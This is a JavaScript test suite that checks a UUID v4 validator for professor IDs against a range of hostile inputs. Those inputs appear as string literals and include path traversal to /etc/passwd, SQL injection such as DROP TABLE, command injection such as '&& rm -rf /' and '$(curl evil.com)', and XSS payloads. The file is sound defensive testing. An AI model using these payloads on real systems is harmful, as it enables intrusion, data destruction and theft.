/**
 * Security Tests for Professor ID Validation
 * Deep-level validation testing without framework dependencies
 */

/**
 * Copy of the validation function from [id].tsx for testing
 */
function isValidProfessorId(id) {
  if (!id || typeof id !== 'string') {
    return false;
  }
  
  // UUID v4 format: xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx
  const uuidV4Regex = /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i;
  
  return uuidV4Regex.test(id);
}

// Test tracking
let totalTests = 0;
let passedTests = 0;
let failedTests = 0;
const failedDetails = [];

function test(description, testFn) {
  totalTests++;
  try {
    testFn();
    passedTests++;
    console.log(`✅ ${description}`);
    return true;
  } catch (error) {
    failedTests++;
    console.log(`❌ ${description}`);
    console.log(`   Error: ${error.message}`);
    failedDetails.push({ description, error: error.message });
    return false;
  }
}

function assertEqual(actual, expected, message) {
  if (actual !== expected) {
    throw new Error(message || `Expected ${expected} but got ${actual}`);
  }
}

console.log('🧪 Running Professor ID Validation Security Tests...\n');
console.log('='.repeat(70));

// ============================================================================
// VALID UUID TESTS
// ============================================================================
console.log('\n📋 VALID UUID TESTS (Should ACCEPT):');
console.log('-'.repeat(70));

test('Accept valid UUID v4 #1', () => {
  assertEqual(
    isValidProfessorId('550e8400-e29b-41d4-a716-446655440000'),
    true,
    'Should accept valid UUID v4'
  );
});

test('Accept valid UUID v4 #2', () => {
  assertEqual(
    isValidProfessorId('6ba7b810-9dad-41d1-80b4-00c04fd430c8'),
    true,
    'Should accept valid UUID v4'
  );
});

test('Accept valid UUID v4 #3', () => {
  assertEqual(
    isValidProfessorId('f47ac10b-58cc-4372-a567-0e02b2c3d479'),
    true,
    'Should accept valid UUID v4'
  );
});

test('Accept UUID with uppercase letters', () => {
  assertEqual(
    isValidProfessorId('550E8400-E29B-41D4-A716-446655440000'),
    true,
    'Should accept uppercase UUID'
  );
});

test('Accept UUID with mixed case', () => {
  assertEqual(
    isValidProfessorId('550e8400-E29B-41d4-A716-446655440000'),
    true,
    'Should accept mixed case UUID'
  );
});

// ============================================================================
// SSRF ATTACK PREVENTION
// ============================================================================
console.log('\n🛡️  SSRF ATTACK PREVENTION (Should BLOCK):');
console.log('-'.repeat(70));

test('Block path traversal: ../admin', () => {
  assertEqual(
    isValidProfessorId('../admin'),
    false,
    'Should block path traversal'
  );
});

test('Block path traversal: ../../etc/passwd', () => {
  assertEqual(
    isValidProfessorId('../../etc/passwd'),
    false,
    'Should block path traversal to sensitive files'
  );
});

test('Block path traversal: ../../../config', () => {
  assertEqual(
    isValidProfessorId('../../../config'),
    false,
    'Should block deep path traversal'
  );
});

test('Block Windows path traversal: ..\\..\\admin', () => {
  assertEqual(
    isValidProfessorId('..\\..\\admin'),
    false,
    'Should block Windows path traversal'
  );
});

test('Block HTTP URL: http://localhost:3000/admin', () => {
  assertEqual(
    isValidProfessorId('http://localhost:3000/admin'),
    false,
    'Should block HTTP URLs'
  );
});

test('Block HTTPS URL: https://evil.com/steal-data', () => {
  assertEqual(
    isValidProfessorId('https://evil.com/steal-data'),
    false,
    'Should block HTTPS URLs'
  );
});

test('Block file:// protocol', () => {
  assertEqual(
    isValidProfessorId('file:///etc/passwd'),
    false,
    'Should block file protocol'
  );
});

test('Block FTP URL', () => {
  assertEqual(
    isValidProfessorId('ftp://internal-server/data'),
    false,
    'Should block FTP URLs'
  );
});

test('Block localhost', () => {
  assertEqual(
    isValidProfessorId('localhost'),
    false,
    'Should block localhost'
  );
});

test('Block IP address: 127.0.0.1', () => {
  assertEqual(
    isValidProfessorId('127.0.0.1'),
    false,
    'Should block loopback IP'
  );
});

test('Block IP address: 192.168.1.1', () => {
  assertEqual(
    isValidProfessorId('192.168.1.1'),
    false,
    'Should block private IP'
  );
});

test('Block IP address: 10.0.0.1', () => {
  assertEqual(
    isValidProfessorId('10.0.0.1'),
    false,
    'Should block private IP'
  );
});

// ============================================================================
// SQL INJECTION PREVENTION
// ============================================================================
console.log('\n💉 SQL INJECTION PREVENTION (Should BLOCK):');
console.log('-'.repeat(70));

test("Block SQL: '; DROP TABLE professors--", () => {
  assertEqual(
    isValidProfessorId("'; DROP TABLE professors--"),
    false,
    'Should block DROP TABLE injection'
  );
});

test("Block SQL: 1' OR '1'='1", () => {
  assertEqual(
    isValidProfessorId("1' OR '1'='1"),
    false,
    'Should block OR injection'
  );
});

test("Block SQL: admin'--", () => {
  assertEqual(
    isValidProfessorId("admin'--"),
    false,
    'Should block comment injection'
  );
});

test("Block SQL: ' UNION SELECT * FROM users--", () => {
  assertEqual(
    isValidProfessorId("' UNION SELECT * FROM users--"),
    false,
    'Should block UNION injection'
  );
});

test("Block SQL: 1; DELETE FROM reviews WHERE '1'='1", () => {
  assertEqual(
    isValidProfessorId("1; DELETE FROM reviews WHERE '1'='1"),
    false,
    'Should block DELETE injection'
  );
});

// ============================================================================
// COMMAND INJECTION PREVENTION
// ============================================================================
console.log('\n⚡ COMMAND INJECTION PREVENTION (Should BLOCK):');
console.log('-'.repeat(70));

test('Block command: ; ls -la', () => {
  assertEqual(
    isValidProfessorId('; ls -la'),
    false,
    'Should block ls command'
  );
});

test('Block command: | cat /etc/passwd', () => {
  assertEqual(
    isValidProfessorId('| cat /etc/passwd'),
    false,
    'Should block piped commands'
  );
});

test('Block command: && rm -rf /', () => {
  assertEqual(
    isValidProfessorId('&& rm -rf /'),
    false,
    'Should block destructive commands'
  );
});

test('Block command: `whoami`', () => {
  assertEqual(
    isValidProfessorId('`whoami`'),
    false,
    'Should block backtick commands'
  );
});

test('Block command: $(curl evil.com)', () => {
  assertEqual(
    isValidProfessorId('$(curl evil.com)'),
    false,
    'Should block $() commands'
  );
});

// ============================================================================
// XSS PREVENTION
// ============================================================================
console.log('\n🔒 XSS PREVENTION (Should BLOCK):');
console.log('-'.repeat(70));

test('Block XSS: <script>alert("xss")</script>', () => {
  assertEqual(
    isValidProfessorId('<script>alert("xss")</script>'),
    false,
    'Should block script tags'
  );
});

test('Block XSS: <img src=x onerror=alert(1)>', () => {
  assertEqual(
    isValidProfessorId('<img src=x onerror=alert(1)>'),
    false,
    'Should block img XSS'
  );
});

test('Block XSS: javascript:alert(1)', () => {
  assertEqual(
    isValidProfessorId('javascript:alert(1)'),
    false,
    'Should block javascript protocol'
  );
});

test('Block XSS: <svg onload=alert(1)>', () => {
  assertEqual(
    isValidProfessorId('<svg onload=alert(1)>'),
    false,
    'Should block SVG XSS'
  );
});

// ============================================================================
// INVALID UUID FORMATS
// ============================================================================
console.log('\n❌ INVALID UUID FORMATS (Should BLOCK):');
console.log('-'.repeat(70));

test('Reject UUID v1', () => {
  assertEqual(
    isValidProfessorId('550e8400-e29b-11d4-a716-446655440000'),
    false,
    'Should reject UUID v1 (not v4)'
  );
});

test('Reject UUID v3', () => {
  assertEqual(
    isValidProfessorId('550e8400-e29b-31d4-a716-446655440000'),
    false,
    'Should reject UUID v3 (not v4)'
  );
});

test('Reject UUID v5', () => {
  assertEqual(
    isValidProfessorId('550e8400-e29b-51d4-a716-446655440000'),
    false,
    'Should reject UUID v5 (not v4)'
  );
});

test('Reject UUID too short', () => {
  assertEqual(
    isValidProfessorId('550e8400-e29b-41d4-a716'),
    false,
    'Should reject incomplete UUID'
  );
});

test('Reject UUID too long', () => {
  assertEqual(
    isValidProfessorId('550e8400-e29b-41d4-a716-446655440000-extra'),
    false,
    'Should reject UUID with extra characters'
  );
});

test('Reject UUID without dashes', () => {
  assertEqual(
    isValidProfessorId('550e8400e29b41d4a716446655440000'),
    false,
    'Should reject UUID without dashes'
  );
});

test('Reject UUID with invalid character', () => {
  assertEqual(
    isValidProfessorId('550e8400-e29b-41d4-g716-446655440000'),
    false,
    'Should reject UUID with non-hex character'
  );
});

test('Reject random string', () => {
  assertEqual(
    isValidProfessorId('not-a-uuid-at-all'),
    false,
    'Should reject random string'
  );
});

test('Reject numeric string', () => {
  assertEqual(
    isValidProfessorId('12345'),
    false,
    'Should reject plain numbers'
  );
});

test('Reject empty string', () => {
  assertEqual(
    isValidProfessorId(''),
    false,
    'Should reject empty string'
  );
});

// ============================================================================
// EDGE CASES
// ============================================================================
console.log('\n🔍 EDGE CASES (Should BLOCK):');
console.log('-'.repeat(70));

test('Reject null', () => {
  assertEqual(
    isValidProfessorId(null),
    false,
    'Should reject null'
  );
});

test('Reject undefined', () => {
  assertEqual(
    isValidProfessorId(undefined),
    false,
    'Should reject undefined'
  );
});

test('Reject array', () => {
  assertEqual(
    isValidProfessorId(['550e8400-e29b-41d4-a716-446655440000']),
    false,
    'Should reject array'
  );
});

test('Reject number', () => {
  assertEqual(
    isValidProfessorId(12345),
    false,
    'Should reject number'
  );
});

test('Reject object', () => {
  assertEqual(
    isValidProfessorId({}),
    false,
    'Should reject object'
  );
});

test('Reject boolean true', () => {
  assertEqual(
    isValidProfessorId(true),
    false,
    'Should reject boolean'
  );
});

test('Reject boolean false', () => {
  assertEqual(
    isValidProfessorId(false),
    false,
    'Should reject boolean'
  );
});

test('Reject whitespace only', () => {
  assertEqual(
    isValidProfessorId('   '),
    false,
    'Should reject whitespace'
  );
});

test('Reject newline', () => {
  assertEqual(
    isValidProfessorId('\n'),
    false,
    'Should reject newline'
  );
});

test('Reject tab', () => {
  assertEqual(
    isValidProfessorId('\t'),
    false,
    'Should reject tab'
  );
});

// ============================================================================
// SPECIAL CHARACTERS
// ============================================================================
console.log('\n🎯 SPECIAL CHARACTERS (Should BLOCK):');
console.log('-'.repeat(70));

test('Reject symbols: @#$%^&*()', () => {
  assertEqual(
    isValidProfessorId('@#$%^&*()'),
    false,
    'Should reject special symbols'
  );
});

test('Reject brackets: {}[]<>', () => {
  assertEqual(
    isValidProfessorId('{}[]<>'),
    false,
    'Should reject brackets'
  );
});

test('Reject tilde and backtick: ~`', () => {
  assertEqual(
    isValidProfessorId('~`'),
    false,
    'Should reject tilde and backtick'
  );
});

// ============================================================================
// RESULTS SUMMARY
// ============================================================================
console.log('\n' + '='.repeat(70));
console.log('📊 TEST RESULTS SUMMARY');
console.log('='.repeat(70));
console.log(`Total Tests Run:    ${totalTests}`);
console.log(`✅ Passed:          ${passedTests} (${((passedTests / totalTests) * 100).toFixed(1)}%)`);
console.log(`❌ Failed:          ${failedTests} (${((failedTests / totalTests) * 100).toFixed(1)}%)`);
console.log('='.repeat(70));

if (failedTests > 0) {
  console.log('\n⚠️  FAILED TEST DETAILS:');
  console.log('-'.repeat(70));
  failedDetails.forEach((failure, index) => {
    console.log(`${index + 1}. ${failure.description}`);
    console.log(`   ${failure.error}\n`);
  });
}

console.log('\n' + '='.repeat(70));
if (failedTests === 0) {
  console.log('🎉 SUCCESS! All security tests passed!');
  console.log('✅ The validation function properly blocks all known attack vectors.');
  console.log('✅ SSRF, SQL Injection, Command Injection, and XSS attacks are prevented.');
  console.log('✅ Only valid UUID v4 formats are accepted.');
  console.log('='.repeat(70));
  process.exit(0);
} else {
  console.log('❌ FAILURE! Some security tests failed.');
  console.log('⚠️  Please review and fix the validation logic.');
  console.log('='.repeat(70));
  process.exit(1);
}
